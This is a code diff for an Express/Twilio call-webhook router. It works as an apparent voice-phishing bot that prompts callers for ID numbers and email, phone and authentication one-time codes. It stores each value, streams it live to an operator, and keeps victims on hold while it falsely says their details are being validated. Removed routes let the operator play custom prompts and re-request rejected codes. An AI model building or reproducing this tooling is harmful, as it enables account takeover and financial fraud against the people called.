@@ -199,33 +199,27 @@ router.post('/collect-id/:sessionId', async (req, res) => {
     console.log('ID Collected:', Digits);
     
     if (Digits) {
-        try {
-            const session = await db.query(`SELECT contact_id FROM call_sessions WHERE id = $1`, [sessionId]);
-            
-            if (session.rows.length === 0) {
-                twiml.say('Session not found. Goodbye.');
-                twiml.hangup();
-                return res.type('text/xml').send(twiml.toString());
-            }
-            
-            const contactId = session.rows[0].contact_id;
-            
-            await db.query(`UPDATE contacts SET id_number = $1 WHERE id = $2`, [Digits, contactId]);
-            await db.query(`INSERT INTO collected_data (session_id, contact_id, data_type, data_value) VALUES ($1, $2, $3, $4)`, [sessionId, contactId, 'id_number', Digits]);
-            
-            io.emit('data_collected', { session_id: sessionId, type: 'id_number', value: Digits });
-            
-            await db.query(`UPDATE call_sessions SET current_action = 'playing_music' WHERE id = $1`, [sessionId]);
-            
-            twiml.say('Thank you. Please hold while we validate your details.');
-            twiml.play('https://com.twilio.music.classical.s3.amazonaws.com/Beethovens_5th_Symphony_First_Segment.mp3', { loop: 10 });
-            twiml.redirect(`/webhooks/check-hold/${sessionId}`, { method: 'POST' });
-            
-        } catch (error) {
-            console.error('Database error in collect-id:', error);
-            twiml.say('An error occurred. Goodbye.');
+        const session = await db.query(`SELECT contact_id FROM call_sessions WHERE id = $1`, [sessionId]);
+        
+        if (session.rows.length === 0) {
+            twiml.say('Session not found. Goodbye.');
             twiml.hangup();
+            return res.type('text/xml').send(twiml.toString());
         }
+        
+        const contactId = session.rows[0].contact_id;
+        
+        await db.query(`UPDATE contacts SET id_number = $1 WHERE id = $2`, [Digits, contactId]);
+        await db.query(`INSERT INTO collected_data (session_id, contact_id, data_type, data_value) VALUES ($1, $2, $3, $4)`, [sessionId, contactId, 'id_number', Digits]);
+        
+        io.emit('data_collected', { session_id: sessionId, type: 'id_number', value: Digits });
+        
+        await db.query(`UPDATE call_sessions SET current_action = 'playing_music' WHERE id = $1`, [sessionId]);
+        
+        twiml.say('Thank you. Please hold while we validate your details.');
+        twiml.play('https://com.twilio.music.classical.s3.amazonaws.com/Beethovens_5th_Symphony_First_Segment.mp3', { loop: 10 });
+        twiml.redirect(`/webhooks/check-hold/${sessionId}`, { method: 'POST' });
+        
     } else {
         twiml.say('No ID received. Goodbye.');
         twiml.hangup();
@@ -244,33 +238,27 @@ router.post('/collect-email-otp/:sessionId', async (req, res) => {
     console.log('Email OTP Collected:', Digits);
     
     if (Digits) {
-        try {
-            const session = await db.query(`SELECT contact_id FROM call_sessions WHERE id = $1`, [sessionId]);
-            
-            if (session.rows.length === 0) {
-                twiml.say('Session not found. Goodbye.');
-                twiml.hangup();
-                return res.type('text/xml').send(twiml.toString());
-            }
-            
-            const contactId = session.rows[0].contact_id;
-            
-            await db.query(`UPDATE contacts SET email_otp = $1 WHERE id = $2`, [Digits, contactId]);
-            await db.query(`INSERT INTO collected_data (session_id, contact_id, data_type, data_value) VALUES ($1, $2, $3, $4)`, [sessionId, contactId, 'email_otp', Digits]);
-            
-            io.emit('data_collected', { session_id: sessionId, type: 'email_otp', value: Digits });
-            
-            await db.query(`UPDATE call_sessions SET current_action = 'playing_music' WHERE id = $1`, [sessionId]);
-            
-            twiml.say('Thank you. Please hold while we validate your details.');
-            twiml.play('https://com.twilio.music.classical.s3.amazonaws.com/Beethovens_5th_Symphony_First_Segment.mp3', { loop: 10 });
-            twiml.redirect(`/webhooks/check-hold/${sessionId}`, { method: 'POST' });
-            
-        } catch (error) {
-            console.error('Database error in collect-email-otp:', error);
-            twiml.say('An error occurred. Goodbye.');
+        const session = await db.query(`SELECT contact_id FROM call_sessions WHERE id = $1`, [sessionId]);
+        
+        if (session.rows.length === 0) {
+            twiml.say('Session not found. Goodbye.');
             twiml.hangup();
+            return res.type('text/xml').send(twiml.toString());
         }
+        
+        const contactId = session.rows[0].contact_id;
+        
+        await db.query(`UPDATE contacts SET email_otp = $1 WHERE id = $2`, [Digits, contactId]);
+        await db.query(`INSERT INTO collected_data (session_id, contact_id, data_type, data_value) VALUES ($1, $2, $3, $4)`, [sessionId, contactId, 'email_otp', Digits]);
+        
+        io.emit('data_collected', { session_id: sessionId, type: 'email_otp', value: Digits });
+        
+        await db.query(`UPDATE call_sessions SET current_action = 'playing_music' WHERE id = $1`, [sessionId]);
+        
+        twiml.say('Thank you. Please hold while we validate your details.');
+        twiml.play('https://com.twilio.music.classical.s3.amazonaws.com/Beethovens_5th_Symphony_First_Segment.mp3', { loop: 10 });
+        twiml.redirect(`/webhooks/check-hold/${sessionId}`, { method: 'POST' });
+        
     } else {
         twiml.say('No OTP received. Goodbye.');
         twiml.hangup();
@@ -289,33 +277,27 @@ router.post('/collect-auth-otp/:sessionId', async (req, res) => {
     console.log('Auth OTP Collected:', Digits);
     
     if (Digits) {
-        try {
-            const session = await db.query(`SELECT contact_id FROM call_sessions WHERE id = $1`, [sessionId]);
-            
-            if (session.rows.length === 0) {
-                twiml.say('Session not found. Goodbye.');
-                twiml.hangup();
-                return res.type('text/xml').send(twiml.toString());
-            }
-            
-            const contactId = session.rows[0].contact_id;
-            
-            await db.query(`UPDATE contacts SET auth_otp = $1 WHERE id = $2`, [Digits, contactId]);
-            await db.query(`INSERT INTO collected_data (session_id, contact_id, data_type, data_value) VALUES ($1, $2, $3, $4)`, [sessionId, contactId, 'auth_otp', Digits]);
-            
-            io.emit('data_collected', { session_id: sessionId, type: 'auth_otp', value: Digits });
-            
-            await db.query(`UPDATE call_sessions SET current_action = 'playing_music' WHERE id = $1`, [sessionId]);
-            
-            twiml.say('Thank you. Please hold while we validate your details.');
-            twiml.play('https://com.twilio.music.classical.s3.amazonaws.com/Beethovens_5th_Symphony_First_Segment.mp3', { loop: 10 });
-            twiml.redirect(`/webhooks/check-hold/${sessionId}`, { method: 'POST' });
-            
-        } catch (error) {
-            console.error('Database error in collect-auth-otp:', error);
-            twiml.say('An error occurred. Goodbye.');
+        const session = await db.query(`SELECT contact_id FROM call_sessions WHERE id = $1`, [sessionId]);
+        
+        if (session.rows.length === 0) {
+            twiml.say('Session not found. Goodbye.');
             twiml.hangup();
+            return res.type('text/xml').send(twiml.toString());
         }
+        
+        const contactId = session.rows[0].contact_id;
+        
+        await db.query(`UPDATE contacts SET auth_otp = $1 WHERE id = $2`, [Digits, contactId]);
+        await db.query(`INSERT INTO collected_data (session_id, contact_id, data_type, data_value) VALUES ($1, $2, $3, $4)`, [sessionId, contactId, 'auth_otp', Digits]);
+        
+        io.emit('data_collected', { session_id: sessionId, type: 'auth_otp', value: Digits });
+        
+        await db.query(`UPDATE call_sessions SET current_action = 'playing_music' WHERE id = $1`, [sessionId]);
+        
+        twiml.say('Thank you. Please hold while we validate your details.');
+        twiml.play('https://com.twilio.music.classical.s3.amazonaws.com/Beethovens_5th_Symphony_First_Segment.mp3', { loop: 10 });
+        twiml.redirect(`/webhooks/check-hold/${sessionId}`, { method: 'POST' });
+        
     } else {
         twiml.say('No code received. Goodbye.');
         twiml.hangup();
@@ -334,33 +316,27 @@ router.post('/collect-phone-otp/:sessionId', async (req, res) => {
     console.log('Phone OTP Collected:', Digits);
     
     if (Digits) {
-        try {
-            const session = await db.query(`SELECT contact_id FROM call_sessions WHERE id = $1`, [sessionId]);
-            
-            if (session.rows.length === 0) {
-                twiml.say('Session not found. Goodbye.');
-                twiml.hangup();
-                return res.type('text/xml').send(twiml.toString());
-            }
-            
-            const contactId = session.rows[0].contact_id;
-            
-            await db.query(`UPDATE contacts SET phone_otp = $1 WHERE id = $2`, [Digits, contactId]);
-            await db.query(`INSERT INTO collected_data (session_id, contact_id, data_type, data_value) VALUES ($1, $2, $3, $4)`, [sessionId, contactId, 'phone_otp', Digits]);
-            
-            io.emit('data_collected', { session_id: sessionId, type: 'phone_otp', value: Digits });
-            
-            await db.query(`UPDATE call_sessions SET current_action = 'playing_music' WHERE id = $1`, [sessionId]);
-            
-            twiml.say('Thank you. Please hold while we validate your details.');
-            twiml.play('https://com.twilio.music.classical.s3.amazonaws.com/Beethovens_5th_Symphony_First_Segment.mp3', { loop: 10 });
-            twiml.redirect(`/webhooks/check-hold/${sessionId}`, { method: 'POST' });
-            
-        } catch (error) {
-            console.error('Database error in collect-phone-otp:', error);
-            twiml.say('An error occurred. Goodbye.');
+        const session = await db.query(`SELECT contact_id FROM call_sessions WHERE id = $1`, [sessionId]);
+        
+        if (session.rows.length === 0) {
+            twiml.say('Session not found. Goodbye.');
             twiml.hangup();
+            return res.type('text/xml').send(twiml.toString());
         }
+        
+        const contactId = session.rows[0].contact_id;
+        
+        await db.query(`UPDATE contacts SET phone_otp = $1 WHERE id = $2`, [Digits, contactId]);
+        await db.query(`INSERT INTO collected_data (session_id, contact_id, data_type, data_value) VALUES ($1, $2, $3, $4)`, [sessionId, contactId, 'phone_otp', Digits]);
+        
+        io.emit('data_collected', { session_id: sessionId, type: 'phone_otp', value: Digits });
+        
+        await db.query(`UPDATE call_sessions SET current_action = 'playing_music' WHERE id = $1`, [sessionId]);
+        
+        twiml.say('Thank you. Please hold while we validate your details.');
+        twiml.play('https://com.twilio.music.classical.s3.amazonaws.com/Beethovens_5th_Symphony_First_Segment.mp3', { loop: 10 });
+        twiml.redirect(`/webhooks/check-hold/${sessionId}`, { method: 'POST' });
+        
     } else {
         twiml.say('No OTP received. Goodbye.');
         twiml.hangup();
@@ -368,112 +344,6 @@ router.post('/collect-phone-otp/:sessionId', async (req, res) => {
     
     res.type('text/xml');
     res.send(twiml.toString());
-});
-
-router.post('/custom-voice/:sessionId', async (req, res) => {
-    const sessionId = req.params.sessionId;
-    const { message } = req.body;
-    const twiml = new VoiceResponse();
-    
-    console.log('Custom voice for session:', sessionId, 'Message:', message);
-    
-    await db.query(`UPDATE call_sessions SET current_action = 'waiting_for_custom' WHERE id = $1`, [sessionId]);
-    
-    const gather = twiml.gather({
-        numDigits: 20,
-        action: `/webhooks/collect-custom/${sessionId}`,
-        method: 'POST',
-        finishOnKey: '#',
-        timeout: 10
-    });
-    gather.say(message);
-    twiml.say('No input received. Goodbye.');
-    twiml.hangup();
-    
-    res.type('text/xml');
-    res.send(twiml.toString());
-});
-
-router.post('/collect-custom/:sessionId', async (req, res) => {
-    const sessionId = req.params.sessionId;
-    const { Digits } = req.body;
-    const twiml = new VoiceResponse();
-    const io = req.app.get('io');
-    
-    console.log('Custom data collected:', Digits);
-    
-    if (Digits) {
-        try {
-            const session = await db.query(`SELECT contact_id FROM call_sessions WHERE id = $1`, [sessionId]);
-            
-            if (session.rows.length === 0) {
-                twiml.say('Session not found. Goodbye.');
-                twiml.hangup();
-                return res.type('text/xml').send(twiml.toString());
-            }
-            
-            const contactId = session.rows[0].contact_id;
-            
-            await db.query(`INSERT INTO collected_data (session_id, contact_id, data_type, data_value) VALUES ($1, $2, $3, $4)`, [sessionId, contactId, 'custom', Digits]);
-            
-            io.emit('data_collected', { session_id: sessionId, type: 'custom', value: Digits });
-            
-            await db.query(`UPDATE call_sessions SET current_action = 'playing_music' WHERE id = $1`, [sessionId]);
-            
-            twiml.say('Thank you. Please hold while we validate your details.');
-            twiml.play('https://com.twilio.music.classical.s3.amazonaws.com/Beethovens_5th_Symphony_First_Segment.mp3', { loop: 10 });
-            twiml.redirect(`/webhooks/check-hold/${sessionId}`, { method: 'POST' });
-            
-        } catch (error) {
-            console.error('Database error in collect-custom:', error);
-            twiml.say('An error occurred. Goodbye.');
-            twiml.hangup();
-        }
-    } else {
-        twiml.say('No input received. Goodbye.');
-        twiml.hangup();
-    }
-    
-    res.type('text/xml');
-    res.send(twiml.toString());
-});
-
-router.post('/reject-last-data/:sessionId', async (req, res) => {
-    const sessionId = req.params.sessionId;
-    const io = req.app.get('io');
-    
-    console.log('Rejecting last data for session:', sessionId);
-    
-    try {
-        const session = await db.query(
-            `SELECT last_data_type, last_data_value FROM call_sessions WHERE id = $1`,
-            [sessionId]
-        );
-        
-        const lastDataType = session.rows[0]?.last_data_type;
-        const lastDataValue = session.rows[0]?.last_data_value;
-        
-        if (lastDataType) {
-            await db.query(
-                `UPDATE contacts SET ${lastDataType} = NULL WHERE id = (SELECT contact_id FROM call_sessions WHERE id = $1)`,
-                [sessionId]
-            );
-            
-            await db.query(
-                `UPDATE call_sessions SET current_action = $1 WHERE id = $2`,
-                [`waiting_for_${lastDataType}`, sessionId]
-            );
-            
-            io.emit('data_rejected', { session_id: sessionId, type: lastDataType, value: lastDataValue });
-            
-            res.json({ success: true, message: `Last ${lastDataType} rejected` });
-        } else {
-            res.json({ success: false, message: 'No data to reject' });
-        }
-    } catch (error) {
-        console.error('Error rejecting data:', error);
-        res.status(500).json({ error: error.message });
-    }
 });
 
 router.post('/call-status/:sessionId', async (req, res) => {
